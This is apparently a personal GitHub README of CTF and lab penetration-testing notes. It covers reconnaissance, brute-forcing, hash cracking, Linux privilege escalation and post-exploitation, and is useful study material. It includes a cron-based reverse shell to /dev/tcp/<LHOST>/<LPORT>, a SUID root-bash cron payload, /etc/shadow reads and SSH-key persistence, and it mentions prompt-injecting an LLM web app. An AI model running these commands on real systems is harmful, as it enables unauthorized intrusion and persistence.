# Systematic-workflow-for-CTF

A part of my experience summary and documentation for hands-on techniques and tools, enumeration workflows,vulenrability reaserch, exloitation and privilege escalation methods practiced in CTF challenges as well as practical labs, which summarizes most aspects of the kill chain process.


> **TryHackMe Profile**: Top 4% https://tryhackme.com/p/WIZ.ZERO

> **Environment**: All activities performed in authorized, isolated labs (TryHackMe, VulnHub, Hack The Box, Personal machines). No external systems targeted.

This is one of the recents challenges that I have finished, a red team operation involving an internal network of an AI startup "AI.vanchat.loc" starting with exploiting the web server through LLM prompt injection, then bypassing firewalls to compromise 1 database, 4 servers, 3 domain controllers, child-parent domain attack, supply chain attack including mysql server and cross domain attack.
<img width="1267" height="657" alt="Screenshot from 2025-12-29 21-49-44" src="https://github.com/user-attachments/assets/b8cfefe9-9aaf-4082-a9f2-abbebb389312" />
✔️ Privilege escalation, pivoting and lateral movement through tunnel forwarding, privilege exploits with tools like Printspoofer and msi packages execution, credentials harvesting with mimikatz, NTLM hash attacks, certificate and kerberos tickets attacks etc ...


---

I follow a structured, layered enumeration process to minimize missed vectors and build a complete attack surface map.

## 🔍 Reconnaissance & Enumeration

```bash
# Full-port scan with default scripts and version detection, I can snipe specific ports depending on the situation
nmap -sC -sV -p- -T4 <target>

# web directory enumeration: I usally use dirb and fuff with custom wordlists and paramaters depending on the target  
dirb http://<target>
ffuf -w wordlist-fuzz.txt -u https://target/FUZZ -rate 1 -mc 400,401,402,403,429,500,501,502,503 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"    

# Web scanner: Personally I don't use this tool much espically with WAF protected apps,
but sometimes I use it with proxy list and specific headers, tags and parameters to not miss low hanging fruits
nuclei -u http://<target> --- can add rate limiting and specefic tags to lower requests
( -rl 5 tags wordpress) for example

#Subdomain enumeration: I usally use subfinder, dnsrecon along with httpx
Subfinder -d target.com | httpx -status-code -title

# OSINT eumeration:
Shodan, Censys and Securitytails are always useful to identify any ip hosts and certificates to bypass WAF proxies 
I usally try Google and Gitub dorking, look for sensitive server files, misconfigured S3 buckets and credentials
UseWayback machine
Waybackurls target.com > file.txt
then check for interesting files (txt, php, json ...) and important endpoints (containing keywords like admin, config ...)

After this I classify each target based on the response to work on them:
So 200 as first priority then try to idnetify what is required to pass 403,401 (like tokens and ip whitelisting)and attempt techniques to bypass
Try to look for hidden endpoints at 404 targets 
500, 501, 503 usally indicate issues with the target server but they're worth investigating.
Some uncommon responses like 410 should be checked too (One time I faced a 418 teapot response in bug bounty, 

# Explore the target app to understand business logic.
Manual inspection for user input to check for client side injections, identify cookies, tokens check for Oauth misconfigs
and various exposures, attempt redirct to explore and server side injections, Account takeover and such. 
# → BurpSuite or caido to analyze requests, headers and identify endpoints, test for OWASP top 10
(depending on the situation), attempt to make unathorized requests and such.

# For windows machines, checking SMB, LDAP and related ports to windows ports is the common way ahead

# Extract metadata from images (CTF steganography)
exiftool image.png
# Reveals: GPS coordinates, camera model, software, timestamps
# Cross-referenced with Wigle.net for Wi-Fi geolocation in advanced challenges


```
💥 Addtional tools 

```bash

# CTF brute-forcing (SSH, FTP, HTTP forms ...) (I use brute forcing only when I have tried other paths)
hydra -l username -P /usr/share/wordlists/rockyou.txt <target> ssh -V
hydra -L users.txt -P passwords.txt <target> http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# SQL injection: 
sqlmap -u "http://target/login" --data="username=sername&password=password"

# Extracting hashes from compromised systems
grep -oE '[a-f0-9]{32}' /etc/passwd.backup       # MD5
grep -oE '\$[0-9]\$\S+' /etc/shadow             # SHA-512 (Linux)
strings memory.dmp | grep -E '^[A-Za-z0-9+/]{20,}={0,2}$'  # Base64 clues

# Cracking with Hashcat and john
./john --format=nt hash.txt --wordlist=rockyou.txt (can specify format to protected zip files, ssh keys ...)
hashcat -m 0   hash.txt /usr/share/wordlists/rockyou.txt   # MD5
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt # SHA-512
--- sometimes using crackstation.com
# Cipher decryption
# → Identified ROT13, Base64, XOR, Caesar via frequency analysis
echo "SGVsbG8gd29ybGQh" | base64 -d
echo "uryyb jbeyq" | tr 'a-z' 'n-za-m'  # ROT13

# Used CyberChef (offline/local) for multi-step decoding chains (e.g., Base64 → ROT13 → XOR)

#Binwalk and steghide for hidden messages in images
Steghide image.png /extract
binwalk image.png (-e option to extract)
```
⛓️ Privilege Escalation

Escalating from initial low-privilege access to full system control.

Linux Privilege Escalation Vectors

```bash
# SUID binaries (GTFOBins-based exploitation)
find / -type f -perm -4000 2>/dev/null
find . -exec /bin/sh \; -quit

# Capabilities
getcap -r / 2>/dev/null
# Example: /usr/bin/python3 = cap_setuid+ep
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Cron jobs & writable scripts
ls -la /etc/cron.d/
echo "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash" > /etc/cron.d/payload

# Kernel exploits (lab-only)
# → Exploited CVE-2021-4034 (PwnKit) and legacy Dirty COW in intentionally vulnerable VMs

# Sudo misconfigurations
sudo -l  # Revealed NOPASSWD entries
sudo /bin/bash  # Direct root shell

```
Additional Automated Enumeration Post-Access using linpeas

```bash
linpeas and winpeas are useful to speed up checking misconfigurations and binaries :
wget http://<local>/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh

# We can also use the command scp in order to transfer the tool file remotly
```
🎯 4. Post-Exploitation & Objective Completion
Maintaining access, proving impact, and fulfilling engagement goals.

Shell Stabilization

```bash

python3 -c 'import pty; pty.spawn("/bin/bash")'
# → Ctrl+Z → stty raw -echo; fg → reset → export TERM=xterm

# Cron-based reverse shell
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1") | crontab -
```
Persistence Mechanisms
```bash
# SSH key injection
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2E... wizard@kali" >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys
```
Listener Setup

```bash
# Netcat 
nc -nvlp 4444
```
Goals Achieved in Labs/CTFs

1 gain root privilegs through web exploitaion and privilege escalation 

2 Cryptograhpy, Stegnography, Hash cracking

3 Pivoting and lateral movement

4 Binary exploitation and living off the land

5 Obfuscation, firewall and antivirus bypass








